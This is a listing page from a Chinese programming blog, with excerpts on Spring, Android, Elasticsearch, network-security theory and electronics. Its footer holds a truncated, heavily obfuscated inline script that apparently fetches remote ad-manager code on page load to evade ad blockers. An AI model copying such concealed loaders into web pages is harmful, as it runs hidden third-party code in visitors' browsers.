Spring Core：核心类库，提供IOC服务；Spring Context：提供框架式的Bean访问方式，以及企业级功能（JNDI、定时任务等）；Spring AOP：AOP服务；Spring DAO：对JDBC的抽象，简化了数据访问异常的处理；Spring ORM：对现有的ORM框架的支持；Spring Web：提供了基本的面向Web的综合特性，例如多方文件上传；Spring MVC：提供面向Web应用的Model-View-Controller实现。 2、什么是IOC、DI 及其两者的优点 、 有哪几种注入方式
IOC:控制反转，把创建对象的控制权利由代码转移到spring的配置文件中。
最直观的表达就是，IOC让对象的创建不用去new了，可以由spring自动生产，使用java的反射机制，根据配置文件在运行时动态的去创建对象以及管理对象，并调用对象的方法的。
DI：依赖注入，在程序运行期间,由外部容器动态地将依赖对象注入到组件中。简单定义就是当一个对象需要另一个对象时，可以把另一个对象注入到对象中去。
优点就是把应用的代码量降到最低，达到松散耦合度。
注入的方式：
构造注入Set注入接口注入 Spring提供以下几种集合的配置元素：
&lt;list&gt;类型用于注入一列值，允许有相同的值。
&lt;set&gt; 类型用于注入一组值，不允许有相同的值。
&lt;map&gt; 类型用于注入一组键值对，键和值都可以为任意类型。
&lt;props&gt;类型用于注入一组键值对，键和值都只能为String类型。
3、谈谈对AOP理解?
aop面向切面编程，关键在于代理模式，Spring AOP使用的动态代理，所谓的动态代理就是说AOP框架不会去修改字节码，而是每次运行时在内存中临时为方法生成一个AOP对象，这个AOP对象包含了目标对象的全部方法，并且在特定的切点做了增强处理，并回调原对象的方法。动态代理可以减少系统中的重复代码，降低了模块间的耦合度，同时提高了系统的可维护性。可用于权限认证、日志、事务处理。
Spring AOP中的动态代理主要有两种方式，JDK动态代理和CGLIB动态代理：
JDK代理：基于接口的代理，不支持类的代理。核心InvocationHandler接口和Proxy类，InvocationHandler 通过invoke()方法反射来调用目标类中的代码，动态地将横切逻辑和业务编织在一起；接着，Proxy利用 InvocationHandler动态创建一个符合某一接口的的实例, 生成目标类的代理对象。
Proxy.newProxyInstance(ClassLoader,Interfaces,InvocationHandler);
CGLIB动态代理：如果代理类没有实现 InvocationHandler 接口（或者说是基于父子类的），那么Spring AOP会选择使用CGLIB来动态代理目标类。CGLIB（Code Generation Library），是一个代码生成的类库，可以在运行时动态的生成指定类的一个子类对象，并覆盖其中特定方法并添加增强代码，从而实现AOP。CGLIB是通过继承的方式做的动态代理，因此如果某个类被标记为final，那么它是无法使用CGLIB做动态代理的
Enhancer是一个非常重要的类，它允许为非接口类型创建一个JAVA代理，Enhancer动态的创建给定类的子类并且拦截代理类的所有的方法，和JDK动态代理不一样的是不管是接口还是类它都能正常工作
sping的动态代理通过代理类为目标对象增加额外功能。
代理本质 = 目标对象+额外功能+代理对象的接口
开发步骤：
1，创建原始对象
2，提供额外功能（实现下面的接口）
MethodBeforeAdvice 额外功能需要运行在原始方法之前执行.AfterReturningAdvice 额外功能需要运行在原始方法之后执行MethodInterceptor 额外功能需要运行在原始方法之前 后执行ThrowsAdvice 额外功能运行在原始方法抛出异常的执行 3，配置切入点
&lt;aop:pointcut id="pc" expression="execution(* *(..))"/&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b57808a34bbc64517288f5eb5d417f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/868cb5cb30ef7e703207114a334495e5/" rel="bookmark">
			RecyclerView 设置滑动速度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1：需求、 RecyclerView 的滑动速度降低或者加大
滑动速率 直接找到官方API但是看了一圈都没有找到可以设置RecyclerView滑动速度的方法。
那就没有办法了只有从源码中进行查看。
首先RecycleView提供了俩个滑动监听的方法如下：
OnScrollListener和OnFlingListener
public abstract static class OnScrollListener { //SCROLL_STATE_IDLE、SCROLL_STATE_DRAGGING、SCROLL_STATE_SETTLING三个状态 public void onScrollStateChanged(RecyclerView recyclerView, int newState){} //滑动就会调用的方法 是一直调用去计算 dx 和dy的 public void onScrolled(RecyclerView recyclerView, int dx, int dy){} } public abstract static class OnFlingListener { //Override this to handle a fling given the velocities in both x and y directions. public abstract boolean onFling(int velocityX, int velocityY); } 重写onFling可以处理抛投（手指快速滑动引起的屏幕惯性滑动），velocityX，velocityY就是x轴，Y轴上的速率啊。顺藤摸 瓜，看看在哪设置的具体的数值。
在唯一调用onFling()的地方，我找到了这样一段代码：
public boolean fling(int velocityX, int velocityY) { if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/868cb5cb30ef7e703207114a334495e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f604f10403b57a10d47aeaafeb14dd56/" rel="bookmark">
			nvidia-smi 的坑。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		运维监控 GPU 的alive的存活状态
发现了一下一些坑
1 供电不足导致 gpu掉线。 我们用的是 1080， 结果功率低于500W， 不足以支撑 gpu，风扇，等配套硬件的功率， 所以导致gpu掉线。
最后，增加供电功率。
2 nvidia-smi 检查存活状态及温度时， 命令延迟 nvidia-smi 这条命令就一直卡在那， 最后借用 timeout 这个命令， 超时自动kill ，
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2bd2cb94534b247b1c5578e16affeb87/" rel="bookmark">
			1030 完美数列 （25 分)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1030 完美数列 （25 分)
给定一个正整数数列，和正整数 p，设这个数列中的最大值是 M，最小值是 m，如果 M≤mp，则称这个数列是完美数列。
现在给定参数 p 和一些正整数，请你从中选择尽可能多的数构成一个完美数列。
输入格式： 输入第一行给出两个正整数 N 和 p，其中 N（≤10​5​​）是输入的正整数的个数，p（≤10​9​​）是给定的参数。第二行给出 N 个正整数，每个数不超过 10​9​​。
输出格式： 在一行中输出最多可以选择多少个数可以用它们组成一个完美数列。
输入样例： 10 8 2 3 20 4 5 1 6 7 8 9 输出样例： 8 思路： 1、首先要知道一个结论：能使选出的数的个数最大的方案，一定是在该递增序列中连续选择若干个数的方案（在此不作证明）
2、问题转化为：在一个递增数列中，确定一个左端点num[ i ],一个右端点num[ j ]使得num[ j ]&lt;=num[ i ]*p成立并且j-i最大。
代码一（二分法）： //#include&lt;bits/stdc++.h&gt; #include&lt;stdio.h&gt; #include&lt;math.h&gt; #include&lt;algorithm&gt; #define maxnum 100001 using namespace std; int N,M,p,m,num[maxnum];//定义变量 int ans=1;//最定义大个数 int binarysearch(int x,long long y) { if(num[N-1]&lt;=y) return N;//若所有数都不大于y则返回N int l=x+1,r=N-1,mid; while(l&lt;r) { mid=(l+r)/2; if(num[mid]&gt;y) { r=mid; } else { l=mid+1; } } return l;//当while结束时l==r，故返回l或者r都可以 } int main() { scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2bd2cb94534b247b1c5578e16affeb87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37663a0119f19a7f84ff5a92486db541/" rel="bookmark">
			正确设置 MME类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		请求中的 response - header 中的content-type项是指�0�2�0�2服务器发送给客户端内容的MIME类型，如果 设置不对 那么浏览器怕是不能正常解析；
const path = require(“path”);
// 多用途Internet邮件扩展（MIME）类型
const mimeType= {
“.323”:“text/h323” ,
“.3gp”:“video/3gpp” ,
“.aab”:“application/x-authoware-bin” ,
“.aam”:“application/x-authoware-map” ,
“.aas”:“application/x-authoware-seg” ,
“.acx”:“application/internet-property-stream” ,
“.ai”:“application/postscript” ,
“.aif”:“audio/x-aiff” ,
“.aifc”:“audio/x-aiff” ,
“.aiff”:“audio/x-aiff” ,
“.als”:“audio/X-Alpha5” ,
“.amc”:“application/x-mpeg” ,
“.ani”:“application/octet-stream” ,
“.apk”:“application/vnd.android.package-archive” ,
“.asc”:“text/plain” ,
“.asd”:“application/astound” ,
“.asf”:“video/x-ms-asf” ,
“.asn”:“application/astound” ,
“.asp”:“application/x-asap” ,
“.asr”:“video/x-ms-asf” ,
“.asx”:“video/x-ms-asf” ,
“.au”:“audio/basic” ,
“.avb”:“application/octet-stream” ,
“.avi”:“video/x-msvideo” ,
“.awb”:“audio/amr-wb” ,
“.axs”:“application/olescript” ,
“.bas”:“text/plain” ,
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/37663a0119f19a7f84ff5a92486db541/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecb5267d5a9dc8d5966907c1c5e59b7f/" rel="bookmark">
			计算机网络知识总结（七）网络安全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络安全 网络安全概述1、计算机网络面临的安全性威胁2、 数据加密模型 两类密码体制1、对称密钥密码体制2、公钥密码体制 数字签名鉴别1、报文鉴别2、实体鉴别 密钥分配1、对称密钥的分配2、公钥的分配 互联网使用的安全协议1、网络层安全协议2、运输层安全协议3、应用层安全协议 系统安全：防火墙与入侵检测1、防火墙2、入侵检测系统 网络安全概述 1、计算机网络面临的安全性威胁 计算机网络的通信方面临两大类威胁：即被动攻击和主动攻击
被动攻击：是指攻击者从网络上窃听他人的通信内容，通常把这类攻击称为截获。
主动攻击主要有以下几种形式：
篡改：攻击者故意篡改网络上传送的报文。这里包括彻底中断传送的报文，甚至是把完全伪造的报文传送给接收方；恶意程序：计算机病毒、计算机蠕虫、特洛伊木马、逻辑炸弹、后门入侵以及流氓软件等等；拒绝服务Dos(Denial of Service)：指攻击者向互联网上的某个服务器不停地发送大量分组，使该服务器无法提供正常服务，甚至完全瘫痪。 一个安全的计算机网络应该设法达到以下四个目标：保密性、端点鉴别、信息的完整性和运行的安全性。
2、 数据加密模型 如下图中，A向B发送明文X，但通过加密算法E运算后，就得出密文Y。接收端利用解密算法D运算和解密密钥K，解出明文。
密钥由密钥中心提供，当密钥需要向远地传送时，一定要通过另一个安全信道。
两类密码体制 1、对称密钥密码体制 对称密钥密码体制：即加密密钥与解密密钥是使用相同的密码体制。
数据加密标准DES属于对称密钥密码体制：DES是一种分组密码。在加密前，先对整个的明文进行分组。每一个组为64位长的二进制数据。然后对每一个64位二进制数据进行加密处理，产生一组64位密文数据。最后将各组密文串接起来，即得出整个的密文。使用的密钥占64位（实际密钥长度为56位，外加8位用于奇偶检验）。
DES的保密性仅取决于对密钥的保密，而算法是公开的。
三重DES：把一个64位明文用一个密钥加密，再用另一个密钥解密，然后再使用第一个密钥加密。
2、公钥密码体制 公钥密码体制使用不同的加密密钥和解密密钥。
加密密钥PK(public key，即公钥)是向公众公开的，而解密密钥SK(secret key，即私钥或密钥)则是需要保密的。加密算法E和解密算法D也都是公开的。
密钥对产生器产生出接收者B的一对密钥：加密密钥和解密密钥。发送者A所用的加密密钥就是接收者B的公钥，它向公众公开。而B所用的解密密钥就是接收者B的私钥，对其他人都保密。
发送者A用B的公钥通过加密算法E运算对明文X加密，得出密文Y，发送给B。B用自己的私钥通过解密算法D运算进行解密。
使用对称密钥，可进行一对一的通信。而使用公钥密码时，可以是多对一的单向保密通信（多人持有B的公钥）。
数字签名 数字签名需要具备以下三种功能：
报文鉴别：接收者能够核实发送者对报文的签名，其他人无法伪造此签名；
报文的完整性：接收者确信所收的数据和发送者发送的完全一样；
不可否认：发送者事后不能抵赖对报文的签名。
A把经过解密运算得到的密文传送给B。B为了核实签名，用A的公钥进行加密运算，还原出明文X。任何人用A的公钥进行加密运算后都可以得出A发送的明文。上图中的通信方式并非为了保密，而是为了进行签名和核实签名，即确认此明文的确是A发的。
因为除A外没有人持有A的私钥，所以除A外没有别人能产生密文，这样B就相信报文X是A签名发送的，这就是报文的鉴别功能。
同理，如果其他人如果篡改过报文，但是无法得到A的私钥来对X进行加密，所以对篡改过的报文进行解密后将得出不可读的明文，即验证了报文的完整性；
因为只有A持有私钥，所以只要能够用解密出明文，A就无法抵赖对此报文的签名。
上面的过程，仅对报文进行了签名，但是对报文X本身还需要进行加密。完整的过程如下图所示：
鉴别 鉴别是要验证通信的对方的确是自己所要通信的对象，而不是其他冒充者，并且所传送的报文是完整的，没有被其他人篡改过。
鉴别分为两种：
报文鉴别：鉴别收到的报文的确是报文的发送者发送的，而不是其他人伪造的或篡改的。这就包含了端点鉴别和报文完整性的鉴别；
实体鉴别：仅仅鉴别发送报文的实体。实体可以是一个人也可以是一个进程。
1、报文鉴别 数字签名能够实现对报文的鉴别，但是对较长的报文进行数字签名会使计算机增加很大的负担，需要较多的时间来计算。我们使用密码散列函数这种相对简单的方法进行鉴别。
密码学中的散列函数是单向函数，逆向变换是不可能的。
常用的散列函数有：MD5和SHA-1，但是都被证明是不安全的。
报文鉴别码MAC(Message Authentication Code)：需要对散列值进行一次加密。
在A从报文X导出散列H后，就对散列H用密钥K加密，这样得到的结果叫做报文鉴别码MAC。A把已加密的报文鉴别码MAC拼接在报文X后面，得到扩展的报文，发送给B。
B收到扩展的报文后，先把报文鉴别码MAC与报文X分离出来。然后用同样的密钥K对收到的报文鉴别码MAC进行解密运算，得出加密前的散列H。再把报文X进行散列函数运算，得出散列H(X)，如果H(X)=H，则相信收到的报文X是A发送的。
由于入侵者不掌握密钥K，所以入侵者无法伪造A的报文鉴别码MAC，因而无法伪造A发送的报文，这就完成了对报文的鉴别。
2、实体鉴别 实体鉴别和报文鉴别不同。报文鉴别是对每一个收到的报文都要鉴别报文的发送者，而实体鉴别是在系统接入的全部持续时间内对和自己通信的对方实体只需要验证一次。
上图中使用对称密钥的方法有很大的漏洞。例如：入侵者C可以从网上截获A发给B的报文，C并不需要破译这个报文，而是直接把这个由A加密的报文发送给B，使B误认为C就是A；然后B就向伪装成A的C发送许多本来应当发给A的报文。这就叫做重放攻击。
为了对付重放攻击，可以使用不重数。不重数就是一个不重复使用的打随机数，即“一次一数”。
A和B对不同的会话必须使用不同的不重数集。由于不重数不能重复使用，所以C在进行重放攻击时无法重复使用所截获的不重数。
密钥分配 密钥分配有两种方式：
网外分配方式：派非常可靠的信使携带密钥分配给互相通信的各用户；网内分配方式：密钥自动分配。 1、对称密钥的分配 目前常用的密钥分配方式是设立密钥分配中心KDC。KDC都是大家信任的机构，其任务是给需要进行秘密通信的用户临时分配一个会话密钥（仅使用一次）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ecb5267d5a9dc8d5966907c1c5e59b7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67e93c18ff6e618855acca87aa2da1f8/" rel="bookmark">
			Android Studio使用分水岭算法测试（1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		First
在Android Studio上搭建好Opencv框架后，可以尝试从本地载入图像，测试基本的灰度图转化是否可以成功使用。
在activity_watershed.xml文件中，添加ImageView控件。添加图片：android:background=@drawable/src"(drawable是文件夹，src是图像名称。
在watershed.java文件中，添加：
private void staticLoadCVLibraies(){
boolean load = OpenCVLoader.initDebug();
if(load){
Log.i(“CV”,“Opencv Librariesloaded”);
}
}
写这篇文章的主要原因也是因为这个，在我调用灰度函数时，手机运行提醒“OpenCV manager package was not found”
显示手机没有安装OpenCV的安装。
这时候，要添加如下代码：
private void staticLoadCVLibraies(){
boolean load = OpenCVLoader.initDebug();
if(load){
Log.i(“CV”,“Opencv Librariesloaded”);
}
}
重新进行灰度图转化测试。成功了。
关于搭建环境，CSDN中有相应的文章：
https://blog.csdn.net/qq_36992688/article/details/79214273
参考上述文章时，我的app在手机上无法运行。无法使用选择图片和灰度图转化功能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f0c5cb4cbcd628709a0a6a2750d5e40/" rel="bookmark">
			微信小程序---时间戳格式转换及函数封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有时候我们会遇到，后台返回的时间是时间戳的形式，需要进行格式转换，小程序时间戳格式转换如下：
两种形式：1.封装好的外部 js,使用时引入. 2.在需要的 js 文件中，封装格式转换函数。 一、封装好的外部 js,使用时引入. 1、如图，将封装好的js文件放在项目公共目录中。
将上图中的 util.js 文件展开，看一下封装的函数内容。
function formatDate(inputTime) { var date = new Date(inputTime); var y = date.getFullYear(); var m = date.getMonth() + 1; m = m &lt; 10 ? ('0' + m) : m; var d = date.getDate(); d = d &lt; 10 ? ('0' + d) : d; var h = date.getHours(); h = h &lt; 10 ? ('0' + h) : h; var minute = date.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f0c5cb4cbcd628709a0a6a2750d5e40/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e891364c351a53fc7f027ab3bdec6445/" rel="bookmark">
			电容ESR表（一） 电容ESR表的特点、测量原理、电路分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		电容ESR表（一） 电容ESR表的特点、测量原理、电路分析
这个专题起源于笔者偶然得到的信息。在完成所译《音频功率放大器设计手册》一书的勘误工作后，笔者因需在网上查阅美国Tektronix公司的示波器资料，看到外国论坛有位网友在介绍维修经验时，大力推荐电容ESR表，称其为电子爱好者的强力工具，对检测电器帮助极大，故而引发了笔者的兴趣。经过一段时间的揣摩、研究、设计、制作及试用，结合本人以往的经验，确认此君所言非虚。这种电容ESR表确实是检修电子设备、排除电路故障的强力工具和十分有用的好帮手。独乐乐不如众乐乐，根据本人掌握的知识和实际设计制作，在此对电容ESR表作全面介绍，以期能给广大电子爱好者提供有益的帮助，推动这一新型工具的普及应用。
1 电容ESR表的特点
可能不少人都没听说过这种表。笔者以前也仅知道，专业仪器的LCR电桥可以测量电容的ESR。何为ESR？测量电容的ESR有什么用？相信很多读者心中会有这样的疑问。为此，先进行简单的背景知识介绍。
一、背景知识介绍
1.电容的ESR
ESR是英语Equivalent Series Resistance的缩写，意为等效串联电阻。自身不会产生任何能量损耗的完美电容只存在于理论，实际的电容总是存在着一些缺陷。这个损耗，在外部的表现就像一个电阻跟电容串联在一起。另一方面，由于引线、卷绕等物理结构因素，电容内部还存在着电感成分。因此，实际电容的等效模型可以表示为图1所示的模式。其中电容C为理想电容，R为等效串联电阻，即ESR，L为等效串联电感，即ESL。引入ESR和ESL，使得模型更接近于电容在电路中的实际表现。
图1 实际电容的等效模型
图2 实际电容与理想电容的差别。斜直线为理想电容的阻抗曲线，呈V字形的是实际电容的阻抗曲线。
图3 不同容量电容的阻抗特性曲线
ESR的存在，令电容的行为表现背离其原来的定义。比如说，理论上“电容两端的电压不能突变”，但实际上，ESR上会产生一定的压降，与突然施加的电流大小有关，令 电容不再遵循理论规律。又如，电容会因ESR上的功耗而产生内部发热。笔者曾将两只早期生产的10μF/ 16V高ESR电解电容，正常地接到微型计算机开关电源的5V输出两端。由于此处高频脉动电压较大，电容内部损耗产生的热量加热内部气体，发出“吱吱”之声，竟在几秒内导致电容炸开，前后两次均是如此。
图2、图3显示了电容的实际阻抗特性。由于ESR以及ESL带来的影响，当频率上升到一定程度，即到了高频区，电容的阻抗不再遵从理论上的规律随频率的升高而降低。在图2中的低频段，电容的容抗在起主要作用，基本上还遵从理想电容的规律。在中间频率段，本应是ESL与C共同谐振而呈现阻抗深谷，但有ESR 的存在，改变了曲线的走向，换言之，ESR在这里起主要作用。在高频区，则是ESL在起主要作用。
图4 不同材质电容随频率变化的ESR曲线。图中方框（顺序为光左右、后上下）列出了所测电容的品种和规格，200/6表示200μF/6V，以此类推。第1、 2、4种为不同的钽电解电容，其中第1种为聚合物固态钽电解电容。第2种为较常见的二氧化锰固态钽电解电容，第4种为多层结构的二氧化锰固态钽电解电容。第3种为二氧化锰固态铌电解电容。第5种为MLCC即多层陶瓷电容，两只100μF/4V并联。第6种为低ESR铝电解电容。
图5 普通电解电容与低ESR电解电容的ESR曲线。上方曲线显示，普通电解电容在较大的频率范围内其ESR值变化并不大。
电容ESR的大小跟电容的制造有关。材质不同，ESR有区别。材质相同，则容量越大，ESR越小，约跟容量的开方成反比。同一品种的电容，耐压越高，ESR往往更低。就材质而言，电解电容的ESR明显高于薄膜电容。在电解电容中，铝电解电容的ESR又高于钽电解电容。在薄膜电容中，聚丙烯、聚苯乙烯等材料的电容ESR较小。一个对比例子是，1μF聚丙烯电容的ESR为10mΩ，而容量达1000μF的铝电解电容，其ESR为0.1Ω。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/efd5cc5d427520616e9431daf0a3d1f3/" rel="bookmark">
			【Java基础】ThreadLocal源码解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		查看ThreadLocal的源码，大体上可以划分为ThreadLocal、Thread、ThreadLocalMap这三个类，所以主要分析一下这三个类的联系。
Thread Thread是线程类，通过Thread.currentThread()方法可以获取当前线程，并且Thread维护一个ThreadLocalMap成员变量用于存储线程私有变量（ThreadLocal.ThreadLocalMap threadLocals = null;）
ThreadLocalMap ThreadLocalMap，作为ThreadLocal的静态内部类，类似map结构，内部维护一个Entry[]数组，Entry类存储key、value键值对。这个map是主要用来存储线程私有变量的。
设值时先根据当前ThreadLocal计算出应该存储在Entry[]中的位置，即数组下标。如果当前下标已存在值，则覆盖value，不存在则设置Entry(key，value)存储在当前下标。
取值时先根据当前ThreadLocal计算出在Entry[]数组中存储的位置即下标。然后根据下标取出Entry，然后得到Entry.value。
ThreadLocal ThreadLocal是入口，相当于一个工具类，提供了一些方法通过ThreadLocal.set()、get() 方法可以直接操作当前线程的ThreadLocalMap。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34e739e14c9789bfa4757bbc551cdb63/" rel="bookmark">
			tx 账户中心客户库es搜索排序坑---preference参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一，preference简述
https://elasticsearch.cn/
elasticsearch可以使用preference参数来指定分片查询的优先级，即我们可以通过该参数来控制搜索时的索引数据分片。
如不设置该参数：在所有有效的主分片以及副本间轮询。
二，结果震荡问题（Bouncing Results）
搜索同一query，结果ES返回的顺序却不尽相同，这就是请求轮询到不同分片，而未设置排序条件，相同相关性评分情况下，是按照所在segment中​lucene id来排序的，相同数据的不同备份之间该id是能保证一致的，故造成结果震荡问题。
如设置该参数，则有一下9中情况
_primary:发送到集群的相关操作请求只会在主分片上执行。
_primary_first:指查询会先在主分片中查询，如果主分片找不到（挂了），就会在副本中查询。
_replica:发送到集群的相关操作请求只会在副本上执行。
_replica_first：指查询会先在副本中查询，如果副本找不到（挂了），就会在主分片中查询。
_local: 指查询操作会优先在本地节点有的分片中查询，没有的话再在其它节点查询。
_prefer_nodes:abc,xyz:在提供的节点上优先执行（在这种情况下为’abc’或’xyz’）
_shards:2,3：限制操作到指定的分片。 （2和“3”）。这个偏好可以与其他偏好组合，但必须首先出现：_shards：2,3 | _primary
_only_nodes:node1,node2:指在指定id的节点里面进行查询，如果该节点只有要查询索引的部分分片，就只在这部分分片中查找，不同节点之间用“，”分隔。
custom(自定义)：注意自定义的preference参数不能以下划线"_"开头。
当preference为自定义时，即该参数不为空，且开头不以“下划线”开头时，特别注意：如果以用户query作为自定义preference时，一定要处理以下划线开头的情况，这种情况下如果不属于以上8种情况，则会抛出异常。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/485/">«</a>
	<span class="pagination__item pagination__item--current">486/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/487/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X